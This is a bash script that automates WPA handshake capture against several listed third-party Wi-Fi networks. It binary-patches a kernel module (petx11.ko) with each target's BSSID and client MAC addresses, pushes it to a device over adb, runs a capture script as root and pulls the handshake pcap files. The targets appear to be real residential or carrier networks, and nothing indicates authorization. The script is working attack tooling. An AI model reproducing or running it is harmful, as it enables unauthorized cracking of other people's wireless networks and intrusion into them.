#!/bin/bash
# run_multi_capture.sh - Run on Mac. Patches petx11 for each target and runs capture.
# Usage: ./run_multi_capture.sh [ROUNDS] [CAPTURE_SEC]
set -e

ROUNDS="${1:-5}"
CAPTURE_SEC="${2:-20}"
BASEDIR="$(cd "$(dirname "$0")" && pwd)"
TMPDIR="$BASEDIR"
PETX11_ORIG="$BASEDIR/petx11.ko"

# Find default BSSID bytes in petx11.ko (Flymodem2631)
DEFAULT_BSSID_HEX="8cf0df1f4fc7"
DEFAULT_CLIENT1="dad3a50505d7"
DEFAULT_CLIENT2="92104b3570e4"

# Targets: BSSID|SSID|FREQ|CLIENT1|CLIENT2
# (clients from scan; use ff:ff:ff:ff:ff:ff if unknown)
TARGETS=(
    "86:1a:24:58:59:1c|CMCC-Hf9K|2437|08:b4:d2:e7:2b:79|ff:ff:ff:ff:ff:ff"
    "04:67:61:d6:dc:93|不想上班|5200|02:4a:6c:1d:d9:9a|4a:06:85:5f:57:ad"
    "18:f2:2c:77:70:81|阿巴阿巴阿巴5g|2412|6c:c3:6a:bf:da:e3|7c:a7:b0:63:04:58"
)

patch_petx11() {
    local BSSID_HEX="$1"
    local C1_HEX="$2"
    local C2_HEX="$3"
    local OUTFILE="$4"

    cp "$PETX11_ORIG" "$OUTFILE"
    python3 -c "
import sys
data = bytearray(open('$OUTFILE', 'rb').read())

def replace_mac(data, old_hex, new_hex, label):
    old = bytes.fromhex(old_hex)
    new = bytes.fromhex(new_hex)
    idx = data.find(old)
    if idx >= 0:
        data[idx:idx+6] = new
        print(f'  Patched {label} at offset {idx}: {old_hex} -> {new_hex}')
        return True
    else:
        print(f'  {label}: {old_hex} not found (may already be patched)')
        return False

replace_mac(data, '$DEFAULT_BSSID_HEX', '$BSSID_HEX', 'BSSID')
replace_mac(data, '$DEFAULT_CLIENT1', '$C1_HEX', 'Client1')
replace_mac(data, '$DEFAULT_CLIENT2', '$C2_HEX', 'Client2')

open('$OUTFILE', 'wb').write(data)
"
}

restore_petx11() {
    # Restore original bytes for next target
    cp "$PETX11_ORIG" "$TMPDIR/petx11_work.ko"
}

echo "============================================"
echo " Multi-Target Handshake Capture"
echo " Targets: ${#TARGETS[@]}"
echo " Rounds: $ROUNDS per target"
echo " Capture: ${CAPTURE_SEC}s per round"
echo "============================================"
echo ""

# Push scripts
adb push "$BASEDIR/grab_multi.sh" /tmp/grab_multi.sh >/dev/null 2>&1
adb push "$BASEDIR/qca_cld3_wlan.ko" /tmp/qca_cld3_wlan.ko >/dev/null 2>&1

RESULTS=()
for entry in "${TARGETS[@]}"; do
    IFS='|' read -r BSSID SSID FREQ CLIENT1 CLIENT2 <<< "$entry"
    BSSID_HEX=$(echo "$BSSID" | tr -d ':' | tr 'A-F' 'a-f')
    C1_HEX=$(echo "$CLIENT1" | tr -d ':' | tr 'A-F' 'a-f')
    C2_HEX=$(echo "$CLIENT2" | tr -d ':' | tr 'A-F' 'a-f')

    echo ""
    echo "========================================"
    echo " TARGET: $SSID ($BSSID) ${FREQ}MHz"
    echo "========================================"
    echo "  Clients: $CLIENT1, $CLIENT2"

    # Patch petx11.ko for this target
    PATCHED="$TMPDIR/petx11_patched.ko"
    echo "  Patching petx11.ko..."
    patch_petx11 "$BSSID_HEX" "$C1_HEX" "$C2_HEX" "$PATCHED"

    # Push patched module
    adb push "$PATCHED" /tmp/petx11.ko >/dev/null 2>&1

    # Run capture
    echo "  Running capture..."
    if adb shell "sudo bash /tmp/grab_multi.sh '$BSSID' '$SSID' '$FREQ' '$ROUNDS' '$CAPTURE_SEC'"; then
        RESULTS+=("OK: $SSID ($BSSID)")
        # Pull handshake
        BSSID_LOWER=$(echo "$BSSID" | tr -d ':' | tr 'A-F' 'a-f')
        adb pull "/tmp/handshake_${BSSID_LOWER}.pcap" "$BASEDIR/handshake_${BSSID_LOWER}.pcap" 2>/dev/null && \
            echo "  Pulled: handshake_${BSSID_LOWER}.pcap"
    else
        RESULTS+=("FAIL: $SSID ($BSSID)")
    fi

    # Restore original petx11.ko
    cp "$PETX11_ORIG" "$TMPDIR/petx11_patched.ko"

    echo ""
done

# Final restore: push original petx11.ko back
adb push "$PETX11_ORIG" /tmp/petx11.ko >/dev/null 2>&1

echo ""
echo "============================================"
echo " RESULTS"
echo "============================================"
for r in "${RESULTS[@]}"; do
    echo "  $r"
done
echo "============================================"
